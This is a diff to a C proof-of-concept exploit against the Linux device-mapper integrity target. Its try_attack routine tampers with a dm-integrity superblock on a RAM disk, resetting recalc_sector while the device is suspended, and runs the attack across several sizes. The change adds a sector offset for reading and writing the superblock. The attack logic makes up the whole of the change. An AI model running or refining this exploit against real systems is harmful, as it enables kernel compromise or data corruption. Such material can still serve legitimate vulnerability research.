@@ -146,7 +146,7 @@ static void dump_sb(const char *tag, const struct dm_sb *sb)
 	fflush(stdout);
 }
 
-static int try_attack(unsigned long long len, const char *spec)
+static int try_attack(unsigned long long len, unsigned long long start, const char *spec)
 {
 	unsigned char buf[SB_BUF];
 	struct dm_sb *sb = (struct dm_sb *)buf;
@@ -177,7 +177,7 @@ static int try_attack(unsigned long long len, const char *spec)
 	dm_suspend(DEV, 1);
 	st("suspend", 0);
 
-	if (rw_sb(0, buf, 0) != 0) {
+	if (rw_sb(start * 512, buf, 0) != 0) {
 		dm_ctl(DM_DEV_REMOVE, DEV);
 		return -1;
 	}
@@ -194,7 +194,7 @@ static int try_attack(unsigned long long len, const char *spec)
 	sb->recalc_sector = 0;
 	dump_sb("after ", sb);
 
-	if (rw_sb(0, buf, 1) != 0) {
+	if (rw_sb(start * 512, buf, 1) != 0) {
 		dm_ctl(DM_DEV_REMOVE, DEV);
 		return -1;
 	}
@@ -223,12 +223,12 @@ int main(void)
 	}
 	printf("control fd=%d\n", ctl_fd);
 
-	try_attack(64, "/dev/ram1 8 4 J 1 journal_sectors:8");
-	try_attack(128, "/dev/ram1 8 4 J 1 journal_sectors:8");
-	try_attack(256, "/dev/ram1 8 4 J 1 journal_sectors:8");
-	try_attack(512, "/dev/ram1 8 4 J 1 journal_sectors:8");
-	try_attack(1024, "/dev/ram1 8 4 J 1 journal_sectors:8");
-	try_attack(2048, "/dev/ram1 8 4 J 1 journal_sectors:8");
+	try_attack(64, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
+	try_attack(128, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
+	try_attack(256, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
+	try_attack(512, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
+	try_attack(2048, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
+	try_attack(4096, 8, "/dev/ram1 8 4 J 1 journal_sectors:8");
 
 	printf("\n=== POC DONE ===\n");
 	close(ctl_fd);
